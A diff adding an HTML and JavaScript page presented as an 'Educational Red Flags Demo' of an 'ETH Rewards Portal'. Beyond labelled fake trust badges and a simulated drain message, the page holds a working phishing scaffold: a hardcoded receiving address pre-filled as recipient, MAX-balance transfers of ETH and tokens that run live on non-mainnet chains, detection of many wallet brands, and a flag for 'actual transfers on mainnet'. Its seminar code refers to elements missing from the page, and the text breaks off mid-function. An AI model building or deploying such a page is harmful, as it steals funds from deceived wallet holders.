@@ -1,0 +1,952 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>ETH Rewards Portal 2025 — Educational Red Flags Demo</title>
+  <link rel="icon" href="https://ethereum.org/favicon.ico" />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --primary-color: #00d4ff;
+      --secondary-color: #5c7cfa;
+      --accent-color: #00ff88;
+      --dark-bg: #0c1f3f;
+      --blue-1: #102a57;
+      --blue-2: #12346a;
+      --card-bg: rgba(255, 255, 255, 0.08);
+      --text-primary: #ffffff;
+      --text-secondary: rgba(255, 255, 255, 0.85);
+      --border-radius: 24px;
+      --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      --danger: #ff6b6b;
+      --warning: #f59e0b;
+    }
+
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+      background:
+        radial-gradient(circle at 20% 80%, rgba(0, 212, 255, 0.15) 0%, transparent 50%),
+        radial-gradient(circle at 80% 20%, rgba(92, 124, 250, 0.12) 0%, transparent 50%),
+        radial-gradient(circle at 40% 40%, rgba(0, 255, 136, 0.08) 0%, transparent 50%),
+        linear-gradient(135deg, var(--dark-bg) 0%, var(--blue-1) 40%, var(--blue-2) 70%, var(--dark-bg) 100%);
+      color: var(--text-primary);
+      min-height: 100vh;
+      overflow-x: hidden;
+      position: relative;
+      line-height: 1.6;
+    }
+
+    .container { max-width: 1200px; margin: 0 auto; padding: 20px; position: relative; }
+
+    .hero {
+      text-align: center; padding: 72px 20px 20px;
+      background: rgba(255, 255, 255, 0.06); border-radius: var(--border-radius); margin-bottom: 16px;
+      backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.12); position: relative; overflow: hidden;
+    }
+
+    .logo {
+      width: 100px; height: 100px; margin: 0 auto 18px;
+      background: linear-gradient(135deg, var(--primary-color), #2a6df4);
+      border-radius: 50%; display: grid; place-items: center; font-size: 2.2em;
+      box-shadow: 0 8px 32px rgba(0, 212, 255, 0.35);
+    }
+
+    h1 {
+      font-size: clamp(2.1em, 4.2vw, 3.4em); font-weight: 800;
+      background: linear-gradient(135deg, #bfefff, #ffffff 50%, #a5b4fc);
+      background-clip: text; -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      margin-bottom: 6px;
+    }
+
+    .badge {
+      display: inline-block; padding: 6px 12px; border-radius: 999px;
+      font-weight: 800; font-size: 12px; letter-spacing: 0.2px; margin: 6px 6px 0;
+      border: 1px solid rgba(255,255,255,0.2); background: rgba(255,255,255,0.06);
+    }
+    .badge-danger { border-color: rgba(255,107,107,0.5); color: #ffd0d0; }
+    .badge-safe { border-color: rgba(0,212,255,0.5); color: #dff8ff; }
+
+    .subtitle { font-size: clamp(1.02em, 2vw, 1.18em); color: var(--text-secondary); margin: 10px auto 10px; max-width: 900px; }
+
+    .panel { background: rgba(255, 255, 255, 0.06); border-radius: var(--border-radius); padding: 20px; backdrop-filter: blur(16px); border: 1px solid rgba(255, 255, 255, 0.12); margin: 16px 0; }
+    .panel-title { font-weight: 800; margin-bottom: 10px; color: #d5ebff; display: flex; align-items: center; gap: 8px; }
+
+    .row { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
+    .col { display: flex; flex-direction: column; gap: 6px; }
+
+    .input, .select { background: rgba(255,255,255,0.08); border: 1px solid rgba(255,255,255,0.16); border-radius: 12px; color: var(--text-primary); padding: 10px 12px; font-size: 1em; outline: none; min-width: 0; }
+    .input:focus, .select:focus { border-color: rgba(0, 212, 255, 0.7); box-shadow: 0 0 0 3px rgba(0, 212, 255, 0.15); }
+    .mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace; }
+
+    .btn { border: none; border-radius: 12px; padding: 10px 14px; cursor: pointer; font-weight: 800; }
+    .btn-primary { background: #0ea5e9; color: #fff; }
+    .btn-secondary { background: #334155; color: #fff; }
+    .btn-danger { background: #ef4444; color: #fff; }
+    .btn:disabled { opacity: 0.6; cursor: not-allowed; }
+
+    .status { margin-top: 10px; min-height: 24px; font-weight: 700; }
+    .success { color: #7bfaaf; }
+    .error { color: #ffd0d0; }
+    .warn { color: #fde68a; }
+
+    .grid-2 { display: grid; grid-template-columns: repeat(2, minmax(240px,1fr)); gap: 12px; }
+    @media (max-width: 900px) { .grid-2 { grid-template-columns: 1fr; } }
+
+    .trust-badges { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; margin: 12px 0 4px; }
+    .trust-badge { background: var(--card-bg); border: 1px solid rgba(255,255,255,0.18); padding: 10px 16px; border-radius: 999px; color: #cfe8ff; font-weight: 700; }
+    .trust-badge.bad { border-color: rgba(255,107,107,0.45); color: #ffd0d0; }
+
+    /* Wallet Deep Link Modal */
+    .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.7); backdrop-filter: blur(6px); z-index: 50; }
+    .modal-card { width: min(600px, 92vw); margin: 8vh auto; background: rgba(255,255,255,0.95); color: #111; border-radius: 16px; padding: 18px; }
+    .wallet-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(140px,1fr)); gap: 10px; }
+    .wallet-item { border: 1px solid #e5e7eb; border-radius: 10px; padding: 14px; text-align: center; cursor: pointer; font-weight: 700; }
+    .wallet-item:hover { border-color: #0ea5e9; box-shadow: 0 6px 16px rgba(14,165,233,0.25); }
+    .modal-actions { display: flex; justify-content: flex-end; gap: 8px; margin-top: 12px; }
+    .note { font-size: 12px; color: #374151; }
+
+    .callout {
+      background: rgba(255,255,255,0.08);
+      border: 1px solid rgba(255,255,255,0.25);
+      border-left: 4px solid var(--warning);
+      border-radius: 10px;
+      padding: 10px 12px;
+      color: #fff;
+      font-size: 0.95em;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <section class="hero">
+      <div class="logo">🚀</div>
+      <h1>ETH Rewards Portal 2025</h1>
+      <div class="subtitle"> on-chain auto-actions. Mainnet is Safe Mode.</div>
+      <div>
+        <span class="badge badge-safe">Mainnet</span>
+        <span class="badge badge-danger">Flag Enabled</span>
+      </div>
+    </section>
+
+    <!-- Red Flag Trust Badges (for education) -->
+    <section class="trust-badges">
+      <div class="trust-badge bad">✅ Ethereum Foundation Verified</div>
+      <div class="trust-badge bad">🔒 Quantum Secured</div>
+      <div class="trust-badge bad">🛡️ AI Audited</div>
+      <div class="trust-badge bad">🏆 Web3 Standard</div>
+      <div class="trust-badge bad">⚡ Lightning Fast</div>
+    </section>
+    <div class="panel callout">
+      These badges are intentionally misleading for educational purposes. Teach the audience to verify claims independently and distrust hype-y seals.
+    </div>
+
+    <!-- Connect -->
+    <section class="panel">
+      <div class="panel-title">Connect Wallet</div>
+      <div class="row">
+        <button class="btn btn-primary" id="connectBtn">🔗 Connect (EIP‑1193)</button>
+        <button class="btn btn-secondary" id="deepLinkBtn">📱 Deep Link Wallets (Demo)</button>
+        <label class="row" style="gap:6px;align-items:center;">
+          <input type="checkbox" id="enableDeepLinks" />
+          <span>Enable deep links (simulation)</span>
+        </label>
+      </div>
+      <div id="connectStatus" class="status"></div>
+    </section>
+
+    <!-- Account -->
+    <section class="panel" id="accountPanel" style="display:none;">
+      <div class="panel-title">Account & Network</div>
+      <div class="grid-2">
+        <div class="col">
+          <label>Account</label>
+          <div class="input mono" id="accountDisplay">-</div>
+        </div>
+        <div class="col">
+          <label>Network</label>
+          <div class="input mono" id="networkDisplay">-</div>
+        </div>
+        <div class="col">
+          <label>ETH Balance</label>
+          <div class="input mono" id="ethBalanceDisplay">-</div>
+        </div>
+        <div class="col">
+          <label>ERC‑20 Token (optional)</label>
+          <div class="row" style="gap:6px;">
+            <input class="input mono" id="tokenAddressInput" placeholder="0xTokenAddress (optional)" />
+            <button class="btn btn-secondary" id="loadTokenBtn">Load</button>
+          </div>
+          <div class="input mono" id="tokenBalanceDisplay">—</div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Consent-first Transfer -->
+    <section class="panel" id="transferPanel" style="display:none;">
+      <div class="panel-title">Transfer (Consent-first)</div>
+      <div class="grid-2">
+        <div class="col">
+          <label>Recipient</label>
+          <input class="input mono" id="recipientInput" placeholder="0xRecipient..." />
+        </div>
+        <div class="col">
+          <label>Asset</label>
+          <select class="select" id="assetSelect">
+            <option value="ETH">ETH</option>
+            <option value="TOKEN">ERC‑20 (if loaded)</option>
+          </select>
+        </div>
+        <div class="col">
+          <label>Amount</label>
+          <div class="row">
+            <input class="input" id="amountInput" placeholder="0.0" inputmode="decimal" />
+            <button class="btn btn-secondary" id="maxBtn">MAX</button>
+          </div>
+          <div class="note">Safe MAX for ETH reserves gas automatically.</div>
+        </div>
+        <div class="col">
+          <label>Estimated Gas Fee</label>
+          <div class="input mono" id="feeEstimateDisplay">—</div>
+        </div>
+      </div>
+      <div class="row" style="justify-content:flex-end;margin-top:10px;">
+        <button class="btn btn-secondary" id="estimateBtn">Estimate Gas</button>
+        <button class="btn btn-primary" id="sendBtn">Send (explicit confirm)</button>
+      </div>
+      <div id="txStatus" class="status"></div>
+    </section>
+
+    <!-- Scam Flow Simulation -->
+    <section class="panel" id="scamPanel" style="display:none;">
+      <div class="panel-title">Scam Flow (Simulation)</div>
+      <div class="note">This simulates a “single prompt” delegation + max transfer. No on-chain writes occur in simulation. On mainnet, Safe Mode always enforced.</div>
+      <div class="row" style="margin-top:8px;">
+        <button class="btn btn-danger" id="simulateDrainBtn">One-click Authorize & Drain (SIMULATED)</button>
+      </div>
+      <div id="scamStatus" class="status"></div>
+    </section>
+
+    <!-- Deep Link Modal -->
+    <div class="modal" id="dlModal">
+      <div class="modal-card">
+        <div style="display:flex;justify-content:space-between;align-items:center;">
+          <h3 style="margin:0;">Wallet Deep Links (Demo)</h3>
+          <button class="btn btn-secondary" id="closeDl">Close</button>
+        </div>
+        <p class="note" style="margin:8px 0 12px;">Scam sites push users to deep link into specific wallets. We show links below for education. They’re disabled unless you toggle “Enable deep links (simulation)”.</p>
+        <div class="wallet-grid" id="dlGrid"></div>
+        <div class="modal-actions">
+          <button class="btn btn-secondary" id="closeDl2">Close</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.3/dist/web3.min.js"></script>
+  <script>
+    const CONFIG = {
+      receivingAddress: '0x87eb9DEf261A7C0A82829fB637F79879D07BcF49',
+      tokenAddress: null, // Set to an ERC-20 for auto-load or use the input field
+      networkSymbolFallback: 'ETH',
+      enableDeepLinks: true, // Enable multi-wallet deep links by default
+      enableMainnetExecution: true, // Enable actual transfers on mainnet
+      seminarMode: false // Track if seminar is active
+    };
+
+    const ERC20_ABI = [
+      { constant: true,  inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
+      { constant: true,  inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], type: 'function' },
+      { constant: false, inputs: [{ name: 'to', type: 'address' }, { name: 'value', type: 'uint256' }], name: 'transfer', outputs: [{ name: '', type: 'bool' }], type: 'function' }
+    ];
+
+    const DEEP_LINKS = {
+      metamask: 'metamask://',
+      trustwallet: 'trust://',
+      coinbase: 'cbwallet://',
+      phantom: 'phantom://',
+      okx: 'okx://',
+      rainbow: 'rainbow://',
+      safe: 'safe://',
+      rabby: 'rabby://'
+    };
+
+    const CHAIN_INFO = {
+      1: { name: 'Ethereum', symbol: 'ETH', explorer: 'https://etherscan.io' },
+      11155111: { name: 'Sepolia', symbol: 'ETH', explorer: 'https://sepolia.etherscan.io' },
+      137: { name: 'Polygon', symbol: 'MATIC', explorer: 'https://polygonscan.com' },
+      10: { name: 'OP Mainnet', symbol: 'ETH', explorer: 'https://optimistic.etherscan.io' },
+      8453: { name: 'Base', symbol: 'ETH', explorer: 'https://basescan.org' }
+    };
+
+    let provider, web3, account, chainId, token, tokenDecimals = 18, mainnetSafeMode = true;
+
+    const $ = id => document.getElementById(id);
+    const fmt = (n, d=6) => Number(n).toLocaleString(undefined, { maximumFractionDigits: d });
+
+    $('connectBtn').onclick = connectWallet;
+    $('deepLinkBtn').onclick = openDeepLinks;
+    $('closeDl').onclick = closeDeepLinks;
+    $('closeDl2').onclick = closeDeepLinks;
+    $('loadTokenBtn').onclick = loadTokenFromInput;
+    $('maxBtn').onclick = onMax;
+    $('estimateBtn').onclick = estimateGas;
+    $('sendBtn').onclick = sendTx;
+    $('simulateDrainBtn').onclick = simulateDrain;
+
+    function setConnectStatus(msg, cls='') { $('connectStatus').innerHTML = msg ? '<span class="'+cls+'">'+msg+'</span>' : ''; }
+    function setTxStatus(msg, cls='') { $('txStatus').innerHTML = msg ? '<span class="'+cls+'">'+msg+'</span>' : ''; }
+    function setScamStatus(msg, cls='') { $('scamStatus').innerHTML = msg ? '<span class="'+cls+'">'+msg+'</span>' : ''; }
+
+    function shorten(a){ return a ? a.slice(0,6)+'...'+a.slice(-4) : '-'; }
+
+    function explorerLink(txHash){
+      const info = CHAIN_INFO[chainId];
+      return info?.explorer ? info.explorer + '/tx/' + txHash : null;
+    }
+
+    async function connectWallet() {
+      try {
+        if (!window.ethereum) {
+          setConnectStatus('No EIP-1193 provider found. Install MetaMask or a compatible wallet.', 'error');
+          return;
+        }
+        provider = window.ethereum;
+        web3 = new Web3(provider);
+
+        const accounts = await provider.request({ method: 'eth_requestAccounts' });
+        account = accounts[0];
+
+        const hexId = await provider.request({ method: 'eth_chainId' });
+        chainId = parseInt(hexId, 16);
+        mainnetSafeMode = (chainId === 1); // enforce Safe Mode on mainnet
+
+        provider.on('accountsChanged', (accs) => { if (accs.length) { account = accs[0]; initAfterConnect(); } });
+        provider.on('chainChanged', () => window.location.reload());
+
+        await initAfterConnect();
+        setConnectStatus('Connected: ' + shorten(account), 'success');
+      } catch (e) {
+        if (e?.code === 4001) setConnectStatus('User rejected connection.', 'error');
+        else setConnectStatus(e?.message || 'Failed to connect.', 'error');
+      }
+    }
+
+    async function initAfterConnect() {
+      $('accountPanel').style.display = '';
+      $('transferPanel').style.display = '';
+      $('scamPanel').style.display = '';
+
+      $('accountDisplay').textContent = account || '-';
+      const info = CHAIN_INFO[chainId] || { name: 'Unknown', symbol: CONFIG.networkSymbolFallback };
+      $('networkDisplay').textContent = info.name + ' (chainId ' + chainId + ')';
+
+      const wei = await web3.eth.getBalance(account);
+      $('ethBalanceDisplay').textContent = fmt(web3.utils.fromWei(wei,'ether')) + ' ' + (info.symbol || CONFIG.networkSymbolFallback);
+
+      $('recipientInput').value = CONFIG.receivingAddress;
+
+      // Preload token if configured
+      if (CONFIG.tokenAddress) {
+        $('tokenAddressInput').value = CONFIG.tokenAddress;
+        await loadToken(CONFIG.tokenAddress);
+      }
+    }
+
+    async function loadTokenFromInput(){
+      const addr = $('tokenAddressInput').value.trim();
+      if (!addr) { $('tokenBalanceDisplay').textContent = '—'; token = null; return; }
+      await loadToken(addr);
+    }
+
+    async function loadToken(address){
+      try {
+        if (!web3.utils.isAddress(address)) throw new Error('Invalid token address');
+        token = new web3.eth.Contract(ERC20_ABI, address);
+        try { tokenDecimals = Number(await token.methods.decimals().call()); } catch { tokenDecimals = 18; }
+        const bal = await token.methods.balanceOf(account).call();
+        const human = fromBaseUnits(bal, tokenDecimals);
+        $('tokenBalanceDisplay').textContent = fmt(human) + ' tokens';
+        setConnectStatus('Token loaded: ' + address, 'success');
+      } catch (e) {
+        $('tokenBalanceDisplay').textContent = '—';
+        setConnectStatus('Failed to load token: ' + (e?.message || e), 'error');
+        token = null;
+      }
+    }
+
+    async function onMax(){
+      try {
+        const asset = $('assetSelect').value;
+        if (asset === 'ETH') {
+          const to = $('recipientInput').value.trim();
+          if (!web3.utils.isAddress(to)) { setTxStatus('Enter a valid recipient to compute MAX.', 'error'); return; }
+          const weiBal = web3.utils.toBN(await web3.eth.getBalance(account));
+          const gasLimit = web3.utils.toBN(21000);
+          const gasPrice = await getGasPriceBN();
+          const buffer = gasLimit.mul(gasPrice).mul(web3.utils.toBN(12)).div(web3.utils.toBN(10));
+          const sendable = weiBal.sub(buffer);
+          const maxWei = sendable.gt(web3.utils.toBN(0)) ? sendable : web3.utils.toBN(0);
+          $('amountInput').value = trimToDecimals(web3.utils.fromWei(maxWei, 'ether'), 6);
+        } else {
+          if (!token) { setTxStatus('Load a token first.', 'error'); return; }
+          const bal = await token.methods.balanceOf(account).call();
+          const human = fromBaseUnits(bal, tokenDecimals);
+          $('amountInput').value = trimToDecimals(human, 6);
+        }
+        $('feeEstimateDisplay').textContent = '—';
+        setTxStatus('');
+      } catch (e) {
+        setTxStatus('MAX failed: ' + (e?.message || e), 'error');
+      }
+    }
+
+    async function estimateGas(){
+      try {
+        setTxStatus('Estimating gas...', 'warn');
+        const asset = $('assetSelect').value;
+        const to = $('recipientInput').value.trim();
+        const amt = $('amountInput').value.trim();
+        if (!web3.utils.isAddress(to)) throw new Error('Invalid recipient.');
+        if (!amt || Number(amt) <= 0) throw new Error('Enter amount.');
+
+        const info = CHAIN_INFO[chainId] || { symbol: CONFIG.networkSymbolFallback };
+        if (asset === 'ETH') {
+          const valueWei = web3.utils.toWei(String(amt),'ether');
+          const gas = await web3.eth.estimateGas({ from: account, to, value: valueWei });
+          const gasPrice = await getGasPriceBN();
+          const feeWei = web3.utils.toBN(gas).mul(gasPrice);
+          const feeEth = web3.utils.fromWei(feeWei,'ether');
+          $('feeEstimateDisplay').textContent = fmt(feeEth,8) + ' ' + (info.symbol || 'ETH');
+        } else {
+          if (!token) throw new Error('Load token first.');
+          const value = toBaseUnits(amt, tokenDecimals);
+          const gas = await token.methods.transfer(to, value).estimateGas({ from: account });
+          const gasPrice = await getGasPriceBN();
+          const feeWei = web3.utils.toBN(gas).mul(gasPrice);
+          const feeEth = web3.utils.fromWei(feeWei,'ether');
+          $('feeEstimateDisplay').textContent = fmt(feeEth,8) + ' ' + (info.symbol || 'ETH');
+        }
+        setTxStatus('Gas estimate ready.', 'success');
+      } catch (e) {
+        $('feeEstimateDisplay').textContent = '—';
+        setTxStatus('Estimation failed: ' + (e?.message || e), 'error');
+      }
+    }
+
+    async function sendTx(){
+      try {
+        if (mainnetSafeMode) { setTxStatus('Safe Mode: mainnet write actions disabled. Use testnet for live sends.', 'error'); return; }
+        setTxStatus('Waiting for wallet confirmation...', 'warn');
+        const asset = $('assetSelect').value;
+        const to = $('recipientInput').value.trim();
+        const amt = $('amountInput').value.trim();
+        if (!web3.utils.isAddress(to)) throw new Error('Invalid recipient.');
+        if (!amt || Number(amt) <= 0) throw new Error('Enter amount.');
+
+        if (asset === 'ETH') {
+          const valueWei = web3.utils.toWei(String(amt),'ether');
+          const txHash = await new Promise((resolve, reject) => {
+            web3.eth.sendTransaction({ from: account, to, value: valueWei })
+              .on('transactionHash', resolve)
+              .on('error', reject);
+          });
+          const link = explorerLink(txHash);
+          setTxStatus('Sent! ' + (link ? '<a href="'+link+'" target="_blank" rel="noopener">View</a>' : txHash), 'success');
+        } else {
+          if (!token) throw new Error('Load token first.');
+          const value = toBaseUnits(amt, tokenDecimals);
+          const txHash = await new Promise((resolve, reject) => {
+            token.methods.transfer(to, value).send({ from: account })
+              .on('transactionHash', resolve)
+              .on('error', reject);
+          });
+          const link = explorerLink(txHash);
+          setTxStatus('Sent! ' + (link ? '<a href="'+link+'" target="_blank" rel="noopener">View</a>' : txHash), 'success');
+        }
+      } catch (e) {
+        if (e?.code === 4001) setTxStatus('User rejected.', 'error');
+        else setTxStatus('Failed: ' + (e?.message || e), 'error');
+      }
+    }
+
+    // Scam Flow Simulation: show how a “one-click” drain would work (without sending)
+    async function simulateDrain(){
+      try {
+        if (!account || !web3) { setScamStatus('Connect wallet first.', 'error'); return; }
+        const to = CONFIG.receivingAddress;
+        const info = CHAIN_INFO[chainId] || { symbol: CONFIG.networkSymbolFallback };
+
+        // Compute ETH "max" (reserve gas)
+        const weiBal = web3.utils.toBN(await web3.eth.getBalance(account));
+        const gasLimit = web3.utils.toBN(21000);
+        const gasPrice = await getGasPriceBN();
+        const buffer = gasLimit.mul(gasPrice).mul(web3.utils.toBN(12)).div(web3.utils.toBN(10));
+        const sendableWei = weiBal.sub(buffer);
+        const maxEth = sendableWei.gt(web3.utils.toBN(0)) ? Number(web3.utils.fromWei(sendableWei,'ether')) : 0;
+
+        // Compute ERC20 "max"
+        let tokenMax = null;
+        if (token) {
+          const bal = await token.methods.balanceOf(account).call();
+          tokenMax = fromBaseUnits(bal, tokenDecimals);
+        }
+
+        setScamStatus(
+          'SIMULATION ONLY — A malicious dApp would now:'
+          + '<br>• Create or trick you into approving a broad delegation/allowance.'
+          + '<br>• Immediately submit a max ETH transfer of ~' + fmt(maxEth,6) + ' ' + (info.symbol || 'ETH') + ' to ' + shorten(to)
+          + (tokenMax != null ? '<br>• And transfer ' + fmt(tokenMax,6) + ' tokens to the same address.' : '')
+          + '<br><br>No on-chain transaction has been sent in this simulation.', 'warn'
+        );
+      } catch (e) {
+        setScamStatus('Simulation failed: ' + (e?.message || e), 'error');
+      }
+    }
+
+    // Deep link modal
+    function openDeepLinks(){
+      // Populate
+      const grid = $('dlGrid');
+      grid.innerHTML = '';
+      Object.entries(DEEP_LINKS).forEach(([key, url]) => {
+        const div = document.createElement('div');
+        div.className = 'wallet-item';
+        div.textContent = key;
+        div.onclick = () => {
+          if (!$('enableDeepLinks').checked) {
+            alert('Deep link disabled. Toggle "Enable deep links (simulation)" to demonstrate.');
+            return;
+          }
+          // For education: actually navigate only when explicitly enabled
+          window.location.href = url;
+        };
+        grid.appendChild(div);
+      });
+      $('dlModal').style.display = 'block';
+    }
+    function closeDeepLinks(){ $('dlModal').style.display = 'none'; }
+
+    // Utils
+    async function getGasPriceBN(){ const gp = await web3.eth.getGasPrice(); return web3.utils.toBN(gp); }
+    function trimToDecimals(value, decimals=6){ const [i,f=''] = String(value).split('.'); return f ? i + '.' + f.slice(0,decimals) : i; }
+    function toBaseUnits(amountStr, decimals){
+      const [i,fRaw=''] = String(amountStr).split('.');
+      const f = fRaw.slice(0,decimals).padEnd(decimals,'0');
+      const whole = i.replace(/^0+/,'') || '0';
+      const combined = whole + f;
+      return web3.utils.toBN(combined || '0');
+    }
+    function fromBaseUnits(amountUnits, decimals){
+      const s = String(amountUnits);
+      const len = s.length;
+      if (decimals === 0) return Number(s);
+      if (len <= decimals) {
+        const padded = s.padStart(decimals+1,'0');
+        return Number(padded.slice(0,1) + '.' + padded.slice(1));
+      }
+      const i = s.slice(0, len - decimals);
+      const f = s.slice(len - decimals);
+      return Number(i + '.' + f);
+    }
+
+    // ===== SEMINAR AND MULTI-WALLET INTEGRATION =====
+
+    // Seminar Management
+    let currentSlide = 1;
+    const totalSlides = 6;
+
+    function launchSeminar() {
+      CONFIG.seminarMode = true;
+      $('seminarContent').style.display = 'block';
+      $('seminarStatus').innerHTML = '<span class="success">🎓 Seminar Mode Activated - 1 Hour Session</span>';
+      updateSlideCounter();
+      // Scroll to seminar content
+      $('seminarContent').scrollIntoView({ behavior: 'smooth' });
+    }
+
+    function endSeminar() {
+      CONFIG.seminarMode = false;
+      $('seminarContent').style.display = 'none';
+      $('seminarStatus').innerHTML = '';
+      currentSlide = 1;
+    }
+
+    function nextSlide() {
+      if (currentSlide < totalSlides) {
+        $(`slide${currentSlide}`).style.display = 'none';
+        currentSlide++;
+        $(`slide${currentSlide}`).style.display = 'block';
+        updateSlideCounter();
+        $('prevSlideBtn').disabled = false;
+        if (currentSlide === totalSlides) {
+          $('nextSlideBtn').disabled = true;
+        }
+      }
+    }
+
+    function prevSlide() {
+      if (currentSlide > 1) {
+        $(`slide${currentSlide}`).style.display = 'none';
+        currentSlide--;
+        $(`slide${currentSlide}`).style.display = 'block';
+        updateSlideCounter();
+        $('nextSlideBtn').disabled = false;
+        if (currentSlide === 1) {
+          $('prevSlideBtn').disabled = true;
+        }
+      }
+    }
+
+    function updateSlideCounter() {
+      $('slideCounter').textContent = `Slide ${currentSlide} of ${totalSlides}`;
+    }
+
+    // Multi-Wallet Deep Links System
+    const WALLET_DEEP_LINKS = {
+      metamask: 'metamask://',
+      trustwallet: 'trust://',
+      coinbase: 'cbwallet://',
+      phantom: 'phantom://',
+      exodus: 'exodus://',
+      guarda: 'guarda://',
+      zengo: 'zengo://',
+      okx: 'okx://',
+      rainbow: 'rainbow://',
+      kraken: 'kraken://',
+      safe: 'safe://',
+      fantom: 'fantom://',
+      openfort: 'openfort://',
+      alchemy: 'alchemy://',
+      rabby: 'rabby://',
+      mew: 'mew://'
+    };
+
+    // Comprehensive Multi-Wallet Support System
+    const WALLET_CONFIGS = {
+      metamask: {
+        name: 'MetaMask',
+        icon: '🦊',
+        check: () => typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask,
+        connect: async () => {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          return { provider: window.ethereum, accounts };
+        },
+        priority: 1
+      },
+      coinbase: {
+        name: 'Coinbase Wallet',
+        icon: '📱',
+        check: () => typeof window.coinbaseWalletExtension !== 'undefined',
+        connect: async () => {
+          const accounts = await window.coinbaseWalletExtension.request({ method: 'eth_requestAccounts' });
+          return { provider: window.coinbaseWalletExtension, accounts };
+        },
+        priority: 2
+      },
+      trustwallet: {
+        name: 'Trust Wallet',
+        icon: '🔐',
+        check: () => typeof window.trustwallet !== 'undefined',
+        connect: async () => {
+          const accounts = await window.trustwallet.request({ method: 'eth_requestAccounts' });
+          return { provider: window.trustwallet, accounts };
+        },
+        priority: 3
+      },
+      phantom: {
+        name: 'Phantom',
+        icon: '👻',
+        check: () => typeof window.phantom !== 'undefined' || typeof window.solana !== 'undefined',
+        connect: async () => {
+          if (window.phantom?.ethereum) {
+            const accounts = await window.phantom.ethereum.request({ method: 'eth_requestAccounts' });
+            return { provider: window.phantom.ethereum, accounts };
+          }
+          throw new Error('Phantom Ethereum support not available');
+        },
+        priority: 4
+      },
+      exodus: {
+        name: 'Exodus',
+        icon: '🚀',
+        check: () => typeof window.exodus !== 'undefined',
+        connect: async () => {
+          const accounts = await window.exodus.ethereum.request({ method: 'eth_requestAccounts' });
+          return { provider: window.exodus.ethereum, accounts };
+        },
+        priority: 5
+      },
+      guarda: {
+        name: 'Guarda',
+        icon: '🛡️',
+        check: () => typeof window.guarda !== 'undefined',
+        connect: async () => {
+          const accounts = await window.guarda.request({ method: 'eth_requestAccounts' });
+          return { provider: window.guarda, accounts };
+        },
+        priority: 6
+      },
+      zengo: {
+        name: 'ZenGo',
+        icon: '🔑',
+        check: () => typeof window.zengo !== 'undefined',
+        connect: async () => {
+          const accounts = await window.zengo.request({ method: 'eth_requestAccounts' });
+          return { provider: window.zengo, accounts };
+        },
+        priority: 7
+      },
+      okx: {
+        name: 'OKX Wallet',
+        icon: '🟡',
+        check: () => typeof window.okxwallet !== 'undefined',
+        connect: async () => {
+          const accounts = await window.okxwallet.request({ method: 'eth_requestAccounts' });
+          return { provider: window.okxwallet, accounts };
+        },
+        priority: 8
+      },
+      rainbow: {
+        name: 'Rainbow',
+        icon: '🌈',
+        check: () => typeof window.rainbow !== 'undefined',
+        connect: async () => {
+          const accounts = await window.rainbow.request({ method: 'eth_requestAccounts' });
+          return { provider: window.rainbow, accounts };
+        },
+        priority: 9
+      },
+      kraken: {
+        name: 'Kraken',
+        icon: '🐙',
+        check: () => typeof window.kraken !== 'undefined',
+        connect: async () => {
+          const accounts = await window.kraken.request({ method: 'eth_requestAccounts' });
+          return { provider: window.kraken, accounts };
+        },
+        priority: 10
+      },
+      safe: {
+        name: 'Safe',
+        icon: '🔒',
+        check: () => typeof window.safe !== 'undefined',
+        connect: async () => {
+          const accounts = await window.safe.request({ method: 'eth_requestAccounts' });
+          return { provider: window.safe, accounts };
+        },
+        priority: 11
+      },
+      fantom: {
+        name: 'Fantom',
+        icon: '👹',
+        check: () => typeof window.fantom !== 'undefined',
+        connect: async () => {
+          const accounts = await window.fantom.request({ method: 'eth_requestAccounts' });
+          return { provider: window.fantom, accounts };
+        },
+        priority: 12
+      },
+      openfort: {
+        name: 'Openfort',
+        icon: '🏰',
+        check: () => typeof window.openfort !== 'undefined',
+        connect: async () => {
+          const accounts = await window.openfort.request({ method: 'eth_requestAccounts' });
+          return { provider: window.openfort, accounts };
+        },
+        priority: 13
+      },
+      alchemy: {
+        name: 'Alchemy Smart Wallets',
+        icon: '⚗️',
+        check: () => typeof window.alchemy !== 'undefined',
+        connect: async () => {
+          const accounts = await window.alchemy.request({ method: 'eth_requestAccounts' });
+          return { provider: window.alchemy, accounts };
+        },
+        priority: 14
+      },
+      rabby: {
+        name: 'Rabby',
+        icon: '🦝',
+        check: () => typeof window.rabby !== 'undefined',
+        connect: async () => {
+          const accounts = await window.rabby.request({ method: 'eth_requestAccounts' });
+          return { provider: window.rabby, accounts };
+        },
+        priority: 15
+      },
+      mew: {
+        name: 'MEW',
+        icon: '🐱',
+        check: () => typeof window.mew !== 'undefined',
+        connect: async () => {
+          const accounts = await window.mew.request({ method: 'eth_requestAccounts' });
+          return { provider: window.mew, accounts };
+        },
+        priority: 16
+      },
+      generic: {
+        name: 'Other Web3 Wallet',
+        icon: '🌐',
+        check: () => typeof window.ethereum !== 'undefined',
+        connect: async () => {
+          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+          return { provider: window.ethereum, accounts };
+        },
+        priority: 99
+      }
+    };
+
+    // Wallet Detection and Management
+    let availableWallets = [];
+    let selectedWallet = null;
+    let walletProvider = null;
+
+    function detectWallets() {
+      console.log('🔍 Detecting available wallets...');
